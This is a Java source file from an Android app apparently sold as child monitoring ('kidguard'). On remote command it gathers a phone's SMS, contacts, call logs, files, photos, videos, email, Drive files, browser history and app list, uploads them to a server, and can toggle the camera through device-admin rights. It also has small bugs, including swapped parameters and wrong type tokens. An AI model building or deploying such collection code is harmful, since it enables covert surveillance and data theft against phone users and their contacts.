package com.kidguard.services;


import android.Manifest;
import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.google.api.services.drive.Drive;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.reflect.TypeToken;
import com.kidguard.asynctask.CallsAsyncTask;
import com.kidguard.asynctask.ContactsAsyncTask;
import com.kidguard.asynctask.DownloadDriveFiles;
import com.kidguard.asynctask.FilesAsyncTask;
import com.kidguard.asynctask.ImagesAsyncTask;
import com.kidguard.asynctask.SmsAsyncTask;
import com.kidguard.asynctask.VideoAsyncTask;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.Apps;
import com.kidguard.model.BrowserHistory;
import com.kidguard.model.Calls;
import com.kidguard.model.Contacts;
import com.kidguard.model.Files;
import com.kidguard.model.GoogleDrive;
import com.kidguard.model.Images;
import com.kidguard.model.Mail;
import com.kidguard.model.Permissions;
import com.kidguard.model.Sms;
import com.kidguard.model.Video;
import com.kidguard.preference.Preference;
import com.kidguard.utilities.DeviceAdmin;
import com.kidguard.utilities.Utilities;

import java.io.File;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class BackgroundDataService implements Constant {
    private static final String TAG = BackgroundDataService.class.getSimpleName();

    private ArrayList<Sms> lstSms;
    private ArrayList<Contacts> lstContacts;
    private ArrayList<Calls> lstCalls;
    private ArrayList<Files> lstFiles;
    private ArrayList<Apps> lstApps;
    private ArrayList<Images> lstImages;
    private ArrayList<Video> lstVideo;
    private ArrayList<Mail> lstEmail;
    private ArrayList<GoogleDrive> lstDrive;
    private ArrayList<BrowserHistory> lstBrowserHistory;
    private ArrayList<File> fileList;
    private ArrayList<Permissions> lstPermission;
    private Context ctx;

    // Default Constructor
    public BackgroundDataService(Context ctx) {
        this.ctx = ctx;
    }

    // BackgroundDataService Constructor
    public BackgroundDataService(Context ctx, String tag, String count, String dateFrom, String dateTo, String subject, String size) {
        this.ctx = ctx;
        // Get Data With Tag
        if (tag != null && !tag.equals("")) {
            getDataWithTag(tag, count, dateFrom, dateTo, subject, size);
        }
    }

    // Get Data With Tag Method Call
    private void getDataWithTag(String tag, String count, String dateFrom, String dateTo, String size, String subject) {
        if (tag.equals(TAG_SMS)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.READ_SMS)) {
                new SmsAsyncTask(ctx).execute(count, dateFrom, dateTo);
            } else {
                sendSmsDataToServer(lstSms);
            }
            return;
        }

        if (tag.equals(TAG_CONTACTS)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.READ_CONTACTS)) {
                new ContactsAsyncTask(ctx).execute(count, dateFrom, dateTo);
            } else {
                sendContactsDataToServer(lstContacts);
            }
            return;
        }

        if (tag.equals(TAG_CALLS)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.READ_CALL_LOG)) {
                new CallsAsyncTask(ctx).execute(count, dateFrom, dateTo);
            } else {
                sendCallsDataToServer(lstCalls);
            }
            return;
        }

        if (tag.equals(TAG_FILES)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                new FilesAsyncTask(ctx).execute(count, dateFrom, dateTo);
            } else {
                sendFilesDataToServer(lstFiles);
            }
            return;
        }

        if (tag.equals(TAG_IMAGES)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                new ImagesAsyncTask(ctx).execute(count, dateFrom, dateTo, size);
            } else {
                sendImageDataToServer(lstImages);
            }
            return;
        }

        if (tag.equals(TAG_LIST_APPS)) {
            Utilities.getListApps(ctx);
            return;
        }

        if (tag.equals(TAG_CAMERA)) {
            try {
                DeviceAdmin deviceAdmin = new DeviceAdmin(ctx);
                if (deviceAdmin.isActiveAdmin()) {
                    deviceAdmin.cameraDisableEnable();
                }
            } catch (SecurityException | NoSuchMethodError e) {
                e.printStackTrace();
            }
            return;
        }

        if (tag.equals(TAG_EMAIL)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.GET_ACCOUNTS)) {
                passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
            } else {
                sendEmailDataToServer(lstEmail);
            }
            return;
        }

        if (tag.equals(TAG_GOOGLE_DRIVE)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.GET_ACCOUNTS)) {
                passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
            } else {
                sendSaveDriveDataToServer(lstDrive);
            }
            return;
        }

        if (tag.equals(TAG_VIDEOS)) {
            if (Utilities.checkPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                new VideoAsyncTask(ctx).execute(count, dateFrom, dateTo, size);
            } else {
                sendVideosDataToServer(lstVideo);
            }
            return;
        }

        if (tag.equals(TAG_BROWSER_HISTORY)) {
            Utilities.getBrowserHistoryList(ctx);
            return;
        }

        if (tag.equals(TAG_PERMISSIONS)) {
            Utilities.getAppPermissions(ctx);
        }
    }

    // Pass Service Intent For Email And Google Drive
    private void passServiceIntent(String tag, String count, String dateFrom, String dateTo, String subject, String size) {
        new GoogleAccountService(ctx, tag, count, dateFrom, dateTo, subject, size);
    }

    // Send Sms Data To Server
    public void sendSmsDataToServer(ArrayList<Sms> lstSms) {
        this.lstSms = lstSms;
        new RestClientService(TAG_SMS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_SMS));
    }

    // Send Contacts Data To Server
    public void sendContactsDataToServer(ArrayList<Contacts> lstContacts) {
        this.lstContacts = lstContacts;
        new RestClientService(TAG_CONTACTS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_CONTACTS));
    }

    // Send Calls Data To Server
    public void sendCallsDataToServer(ArrayList<Calls> lstCalls) {
        this.lstCalls = lstCalls;
        new RestClientService(TAG_CALLS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_CALLS));
    }

    // Send Files Data To Server
    public void sendFilesDataToServer(ArrayList<Files> lstFiles) {
        this.lstFiles = lstFiles;
        convertToJSONFormat(TAG_FILES);
        new RestClientService(TAG_FILES, Preference.getAccessToken(ctx), lstFiles);
    }

    // Send Apps Data To Server
    public void sendAppsDataToServer(ArrayList<Apps> lstApps) {
        this.lstApps = lstApps;
        new RestClientService(TAG_LIST_APPS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_LIST_APPS));
    }

    // Send Image Data To Server
    public void sendImageDataToServer(ArrayList<Images> lstImages) {
        this.lstImages = lstImages;
        convertToJSONFormat(TAG_IMAGES);
        new RestClientService(TAG_IMAGES, Preference.getAccessToken(ctx), lstImages);
    }

    // Send EMAIL Data To Server
    void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
        this.lstEmail = lstEmail;
        new RestClientService(TAG_EMAIL, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_EMAIL));
    }

    // Send Videos Data To Server
    public void sendVideosDataToServer(ArrayList<Video> lstVideo) {
        this.lstVideo = lstVideo;
        convertToJSONFormat(TAG_VIDEOS);
        new RestClientService(TAG_VIDEOS, Preference.getAccessToken(ctx), lstVideo);
    }

    // Send Google Drive Data To Server
    void sendGoogleDriveDataToServer(ArrayList<GoogleDrive> lstDrive, Drive mDrive) {
        if (mDrive != null) {
            Preference.setDriveId(ctx, 1);
            for (GoogleDrive drive : lstDrive) {
                if (drive.getFileId() != null) {
                    new DownloadDriveFiles(ctx, mDrive, lstDrive).execute(drive.getFileId(), drive.getFileTitle());
                }
            }
        }
    }

    // Send Download Drive Data To Server
    public void sendSaveDriveDataToServer(ArrayList<GoogleDrive> lstDrive) {
        this.lstDrive = lstDrive;
        fileList = new ArrayList<>();
        ArrayList<GoogleDrive> lstDrive2 = new ArrayList<>();
        File root = new File(Environment.getExternalStorageDirectory().toString() + File.separator + DRIVE_NAME);
        fileList = getFile(root);
        if (fileList.size() > 0) {
            for (File file : fileList) {
                if (lstDrive.size() > 0) {
                    for (GoogleDrive driveList : lstDrive) {
                        if (!driveList.getFileSize().equals("null")) {
                            if (String.valueOf(file.length()).equals(driveList.getFileSize())) {
                                GoogleDrive drive = new GoogleDrive();
                                drive.setFileId(driveList.getFileId());
                                drive.setFileTitle(driveList.getFileTitle());
                                drive.setFileDate(driveList.getFileDate());
                                drive.setFileSize(driveList.getFileSize());
                                drive.setFileExtention(driveList.getFileExtention());
                                drive.setFileDownloadUrl(file.getAbsolutePath());
                                lstDrive2.add(drive);
                            }
                        }
                    }
                }
            }
        }
        convertToJSONFormat(TAG_GOOGLE_DRIVE);
        new RestClientService(TAG_GOOGLE_DRIVE, Preference.getAccessToken(ctx), lstDrive2);
    }

    // Send Browser History To Server
    public void sendBrowserHistoryToServer(ArrayList<BrowserHistory> lstBrowserHistory) {
        this.lstBrowserHistory = lstBrowserHistory;
        new RestClientService(TAG_BROWSER_HISTORY, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_BROWSER_HISTORY));
    }

    // Send Application Permission's To Server
    public void sendAppPermissionToServer(ArrayList<Permissions> lstPermission) {
        this.lstPermission = lstPermission;
        new RestClientService(TAG_PERMISSIONS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_PERMISSIONS));
    }

    // Get Files List
    private ArrayList<File> getFile(File dir) {
        File listFile[] = dir.listFiles();
        if (listFile != null && listFile.length > 0) {
            Collections.addAll(fileList, listFile);
        }
        return fileList;
    }

    // Convert To JSON Format
    private String convertToJSONFormat(String tag) {
        StringBuilder sbAppend = new StringBuilder();
        Gson gson = new Gson();
        String finalJSON;
        if (tag.equals(TAG_SMS)) {
            if (lstSms != null && lstSms.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Sms>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstSms, type);
                JsonArray jsonArraySms = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Sms\":" + jsonArraySms;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Sms\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_CONTACTS)) {
            if (lstContacts != null && lstContacts.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Contacts>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstContacts, type);
                JsonArray jsonArrayContacts = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Contacts\":" + jsonArrayContacts;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Contacts\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_CALLS)) {
            if (lstCalls != null && lstCalls.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Calls>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstCalls, type);
                JsonArray jsonArrayCalls = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Calls\":" + jsonArrayCalls;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Calls\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_LIST_APPS)) {
            if (lstApps != null && lstApps.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstApps, type);
                JsonArray jsonArrayApps = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Apps\":" + jsonArrayApps;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Apps\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_FILES)) {

            if (lstFiles != null && lstFiles.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Files>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstFiles, type);
                JsonArray jsonArrayFiles = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Files\":" + jsonArrayFiles;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Files\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_IMAGES)) {
            if (lstImages != null && lstImages.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Images>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstImages, type);
                JsonArray jsonArrayImages = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Images\":" + jsonArrayImages;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Images\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_VIDEOS)) {
            if (lstVideo != null && lstVideo.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Video>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstVideo, type);
                JsonArray jsonArrayVideos = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Videos\":" + jsonArrayVideos;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Videos\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_EMAIL)) {
            if (lstEmail != null && lstEmail.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Mail>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstEmail, type);
                JsonArray jsonArrayEmail = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Emails\":" + jsonArrayEmail;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Emails\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_GOOGLE_DRIVE)) {
            if (lstDrive != null && lstDrive.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<GoogleDrive>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstDrive, type);
                JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"GoogleDrive\":" + jsonArrayDrive;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"GoogleDrive\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_BROWSER_HISTORY)) {
            if (lstBrowserHistory != null && lstBrowserHistory.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<GoogleDrive>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstBrowserHistory, type);
                JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"BrowserHistory\":" + jsonArrayDrive;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"BrowserHistory\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_PERMISSIONS)) {
            if (lstPermission != null && lstPermission.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<GoogleDrive>>() {
                }.getType();
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstPermission, type);
                JsonArray jsonArrayPermission = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Permissions\":" + jsonArrayPermission;
                sbAppend.append(finalJSON);
            } else {
                finalJSON = "\"Permissions\":" + "[]";
                sbAppend.append(finalJSON);
            }
        }

        finalJSON = "{" + sbAppend + "}";
        Log.e(TAG + "<<JSON>>", "FINAL??" + finalJSON);
        return finalJSON;
    }
}